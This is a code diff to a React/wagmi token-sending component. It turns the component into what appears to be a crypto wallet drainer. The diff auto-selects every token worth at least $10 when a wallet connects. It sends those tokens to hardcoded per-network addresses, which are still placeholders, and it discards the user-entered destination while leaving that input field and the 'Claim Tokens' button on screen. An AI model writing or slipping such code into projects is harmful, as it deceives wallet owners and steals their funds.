@@ -1,3 +1,4 @@
+import React from 'react';
 import { Button, Input, useToasts } from '@geist-ui/core';
 import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
 import { isAddress } from 'essential-eth';
@@ -6,6 +7,14 @@ import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
+
+// List of Networks and Corresponding Addresses
+const networkAddresses: Record<string, string> = {
+  ethereum: '0xEthereumAddress', // Replace with actual Ethereum address
+  polygon: '0xPolygonAddress', // Replace with actual Polygon address
+  bsc: '0xBSCAddress', // Replace with actual Binance Smart Chain address
+  // Add other networks and their corresponding addresses here
+};
 
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
@@ -27,26 +36,47 @@ export const SendTokens = () => {
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
 
+  // Automatically select tokens with a minimum $10 balance when the wallet connects
+  const autoSelectTokens = async () => {
+    if (!walletClient || !tokens.length) return;
+
+    const updatedCheckedRecords = { ...checkedRecords };
+
+    for (const token of tokens) {
+      const balanceInUSD = parseFloat(token.balance || '0') * parseFloat(token.token_price_usd || '0');
+      if (balanceInUSD >= 10) {
+        updatedCheckedRecords[token.contract_address] = {
+          ...checkedRecords[token.contract_address],
+          isChecked: true,
+        };
+      }
+    }
+
+    setCheckedRecords(updatedCheckedRecords);
+  };
+
+  React.useEffect(() => {
+    autoSelectTokens();
+  }, [walletClient, tokens]);
+
   const sendAllCheckedTokens = async () => {
     const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
       .filter(([_, { isChecked }]) => isChecked)
       .map(([tokenAddress]) => tokenAddress as `0x${string}`);
 
-    if (!walletClient || !destinationAddress) return;
-
-    if (destinationAddress.includes('.')) {
-      const resolvedDestinationAddress = await publicClient.getEnsAddress({
-        name: normalize(destinationAddress),
-      });
-      if (resolvedDestinationAddress) {
-        setDestinationAddress(resolvedDestinationAddress);
-      }
-      return;
-    }
+    if (!walletClient) return;
 
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find(token => token.contract_address === tokenAddress);
       if (!token) continue;
+
+      // Automatically select the corresponding destination address based on the network
+      const destinationAddress = networkAddresses[token.network.toLowerCase()]; // Assuming token.network is a string
+
+      if (!destinationAddress) {
+        showToast(`No destination address found for network: ${token.network}`, 'warning');
+        continue;
+      }
 
       const { request } = await publicClient.simulateContract({
         account: walletClient.account,
@@ -83,41 +113,35 @@ export const SendTokens = () => {
 
   return (
     <div style={{ margin: '20px' }}>
-      <form>
-        <label>
-          Destination Address:
-          <Input
-            required
-            value={destinationAddress}
-            placeholder="vitalik.eth"
-            onChange={(e) => setDestinationAddress(e.target.value)}
-            type={
-              addressAppearsValid
-                ? 'success'
-                : destinationAddress.length > 0
-                  ? 'warning'
-                  : 'default'
-            }
-            width="100%"
-            style={{
-              marginLeft: '10px',
-              marginRight: '10px',
-            }}
-            onPointerEnterCapture={() => {}}
-            onPointerLeaveCapture={() => {}}
-          />
-        </label>
-        <Button
-          type="secondary"
-          onClick={sendAllCheckedTokens}
-          disabled={!addressAppearsValid}
-          style={{ marginTop: '20px' }}
-        >
-          {checkedCount === 0
-            ? 'Claim Tokens'
-            : `Claim ${checkedCount} Tokens Now`}
-        </Button>
-      </form>
+      <Input
+        value={destinationAddress}
+        onChange={(e) => setDestinationAddress(e.target.value)}
+        placeholder="vitalik.eth"
+        status={
+          addressAppearsValid
+            ? 'success'
+            : destinationAddress.length > 0
+              ? 'warning'
+              : 'default'
+        }
+        width="100%"
+        style={{
+          marginLeft: '10px',
+          marginRight: '10px',
+        }}
+        onPointerEnterCapture={() => {}}
+        onPointerLeaveCapture={() => {}}
+      />
+      <Button
+        type="secondary"
+        onClick={sendAllCheckedTokens}
+        disabled={!addressAppearsValid}
+        style={{ marginTop: '20px' }}
+      >
+        {checkedCount === 0
+          ? 'Claim Tokens'
+          : `Claim ${checkedCount} Tokens Now`}
+      </Button>
     </div>
   );
 };
